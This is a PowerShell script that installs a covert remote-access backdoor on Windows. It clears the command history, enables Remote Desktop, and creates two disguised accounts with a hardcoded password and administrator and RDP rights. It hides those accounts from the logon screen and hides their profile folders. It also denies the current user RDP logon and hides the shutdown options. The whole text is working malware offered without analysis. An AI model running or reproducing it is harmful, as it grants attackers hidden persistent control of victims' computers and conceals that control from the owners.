Clear-Host
Remove-Item (Get-PSReadlineOption).HistorySavePath -ErrorAction SilentlyContinue

$tempDir = "$env:TEMP\pol_temp"
$configFile = "$tempDir\secpol.inf"
$dbFile = "$tempDir\secpol.sdb"

$currentUser = "$env:USERDOMAIN\$env:USERNAME"
$adminSID = "S-1-5-32-544"
$rdpUsersSID = "S-1-5-32-555"

$adminGroupName = (New-Object System.Security.Principal.SecurityIdentifier($adminSID)).Translate([System.Security.Principal.NTAccount]).Value.Split('\')[1]
$rdpGroupName = (New-Object System.Security.Principal.SecurityIdentifier($rdpUsersSID)).Translate([System.Security.Principal.NTAccount]).Value.Split('\')[1]

New-Item -ItemType Directory -Path $tempDir -Force > $null
secedit /export /cfg $configFile > $null 2>&1

$lines = [System.Collections.Generic.List[string]](Get-Content $configFile)
$privRightsIndex = $lines.IndexOf("[Privilege Rights]")
if ($privRightsIndex -eq -1) { exit }

$shutdownIndex = ($lines | Select-String "^SeShutdownPrivilege").LineNumber
if ($shutdownIndex) {
    $lines[$shutdownIndex[0] - 1] = "SeShutdownPrivilege = $adminSID"
} else {
    $lines.Insert($privRightsIndex + 1, "SeShutdownPrivilege = $adminSID")
}

$denyIndex = ($lines | Select-String "^SeDenyRemoteInteractiveLogonRight").LineNumber
if ($denyIndex) {
    $lineNum = $denyIndex[0] - 1
    $existing = $lines[$lineNum].Split("=")[1].Trim() -split ","
    if ($existing -notcontains $currentUser) {
        $existing += $currentUser
    }
    $lines[$lineNum] = "SeDenyRemoteInteractiveLogonRight = " + ($existing -join ",")
} else {
    $lines.Insert($privRightsIndex + 2, "SeDenyRemoteInteractiveLogonRight = $currentUser")
}

$lines | Set-Content $configFile -Encoding Unicode > $null 2>&1
secedit /configure /db $dbFile /cfg $configFile /areas USER_RIGHTS /quiet > $null 2>&1
Remove-Item $tempDir -Recurse -Force > $null 2>&1

Set-ItemProperty -Path "HKLM:\SOFTWARE\Microsoft\Windows\CurrentVersion\Policies\System" -Name "ShutdownWithoutLogon" -Value 0 -Type DWord > $null
Set-ItemProperty -Path "HKLM:\SOFTWARE\Microsoft\PolicyManager\default\Start\HideShutdown" -Name "Value" -Value 1 -Type DWord > $null
Set-ItemProperty -Path "HKLM:\SOFTWARE\Microsoft\PolicyManager\default\Start\HideSleep" -Name "Value" -Value 1 -Type DWord > $null
Set-ItemProperty -Path "HKLM:\SOFTWARE\Microsoft\PolicyManager\default\Start\HideHibernate" -Name "Value" -Value 1 -Type DWord > $null

Set-ItemProperty -Path "HKLM:\SYSTEM\CurrentControlSet\Control\Terminal Server" -Name "fDenyTSConnections" -Value 0 > $null
Enable-NetFirewallRule -DisplayGroup "Remote Desktop" > $null
Set-Service -Name TermService -StartupType Automatic > $null
Start-Service TermService > $null

$password = "Adm!n@93f"
$userAccounts = @("HomeGroupUser", "Other user")

$defaultAccountDescription = "A user account managed by the system."
try {
    $defaultAccount = Get-LocalUser -Name "DefaultAccount" -ErrorAction Stop
    $defaultAccountDescription = $defaultAccount.Description
} catch {}

foreach ($user in $userAccounts) {
    try {
        $userExists = Get-LocalUser -Name "$user" -ErrorAction SilentlyContinue
        if (-not $userExists) {
            net user "$user" "$password" /add > $null 2>&1
            net user "$user" /comment:"$defaultAccountDescription" > $null 2>&1
            net user "$user" /expires:never > $null 2>&1
            net user "$user" /active:yes > $null 2>&1
        }

        Set-LocalUser -Name "$user" -PasswordNeverExpires $true > $null 2>&1

        $regPath = "HKLM:\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Winlogon\SpecialAccounts\UserList"
        if (-not (Test-Path $regPath)) { New-Item -Path $regPath -Force > $null }
        New-ItemProperty -Path $regPath -Name "$user" -PropertyType DWORD -Value 0 -Force > $null

        $isDomainUser = ($user -like "*\*")
        $userForGroup = if ($isDomainUser) { $user } else { "$env:COMPUTERNAME\$user" }

        cmd /c "net localgroup `"$adminGroupName`" `"$userForGroup`" /add" > $null 2>&1
        cmd /c "net localgroup `"$rdpGroupName`" `"$userForGroup`" /add" > $null 2>&1

        $userFolder = "$env:SystemDrive\Users\$user"
        if (-not (Test-Path $userFolder)) {
            try {
                Copy-Item "$env:SystemDrive\Users\Default" $userFolder -Recurse -Force -ErrorAction Stop > $null
                Sleep 3
                attrib +h +s "$userFolder"
            } catch {
                New-Item -Path $userFolder -ItemType Directory -Force > $null
                Sleep 3
                attrib +h +s "$userFolder"
            }
        } else {
            attrib +h +s "$userFolder"
        }

    } catch {}
}

Exit
